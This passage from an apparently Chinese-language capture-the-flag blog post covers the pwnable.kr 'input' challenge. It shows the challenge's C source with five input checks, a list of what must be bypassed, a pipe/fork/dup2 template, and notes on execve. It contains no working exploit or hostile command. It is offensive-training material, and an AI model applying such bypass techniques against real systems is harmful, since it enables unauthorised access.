class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here's your flag</span></span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出前面有5个地方需要绕过的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1：就是argc和argv</span><br><span class="line">2：stdin和stderr</span><br><span class="line">3：env</span><br><span class="line">4：存在文件\x0a </span><br><span class="line">5：socket通信</span><br></pre></td></tr></table></figure><p>记录下一些get到的知识点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、用pipe创建管道，试两个进程间进行通信</span><br><span class="line">2、用fork创建进程</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> writepipe[<span class="number">2</span>] = &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;, <span class="comment">/* parent -&gt; child */</span></span><br><span class="line">    readpipe [<span class="number">2</span>] = &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;; <span class="comment">/* child -&gt; parent */</span></span><br><span class="line"><span class="keyword">pid_t</span>   childpid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * CREATE THE PAIR OF PIPES</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Pipes have two ends but just one direction: to get a two-way</span></span><br><span class="line"><span class="comment"> * conversation you need two pipes. It's an error if we cannot make</span></span><br><span class="line"><span class="comment"> * them both, and we define these macros for easy reference.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">writepipe[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( pipe(readpipe) &lt; <span class="number">0</span>  ||  pipe(writepipe) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* FATAL: cannot create pipe */</span></span><br><span class="line">    <span class="comment">/* close readpipe[0] &amp; [1] if necessary */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PARENT_READ readpipe[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHILD_WRITE readpipe[1]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHILD_READ  writepipe[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PARENT_WRITE    writepipe[1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( (childpid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* FATAL: cannot fork child */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( childpid == <span class="number">0</span> )   <span class="comment">/* in the child */</span></span><br><span class="line">&#123;</span><br><span class="line">    close(PARENT_WRITE);</span><br><span class="line">    close(PARENT_READ);</span><br><span class="line"></span><br><span class="line">    dup2(CHILD_READ,  <span class="number">0</span>);  close(CHILD_READ);</span><br><span class="line">    dup2(CHILD_WRITE, <span class="number">1</span>);  close(CHILD_WRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do child stuff */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>                <span class="comment">/* in the parent */</span></span><br><span class="line">&#123;</span><br><span class="line">    close(CHILD_READ);</span><br><span class="line">    close(CHILD_WRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do parent stuff */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">首先fork()创建的进程(&quot;即当前的进程的镜像&quot;),两者的初始状态一样，执行互不干扰。</span><br><span class="line">另外fork() 复制程序时不是从** #include **处开始复制的，因为fork是把进程当前的情况拷贝一份，所以执行fork()，前面的已经执行完了，fork()只拷贝下一行代码到新进程。</span><br><span class="line"></span><br><span class="line">pipe(int fd[2])函数可以得到两个file descriptors 形成一个单向的pipe,fd[0]固定为读端，fd[1]固定为写端。</span><br><span class="line"></span><br><span class="line">另外 execv家族有很多，其中的execve()可以控制传进去的envp,env</span><br><span class="line">int execve(const char *filename, char *const argv[ ], char *const envp[ ]);</span><br></pre></td></tr></table></figure><p><a href="http://unixwiz.net/techtips/remap-pipe-fds.html" target="_blank" rel="noopener">pipe</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
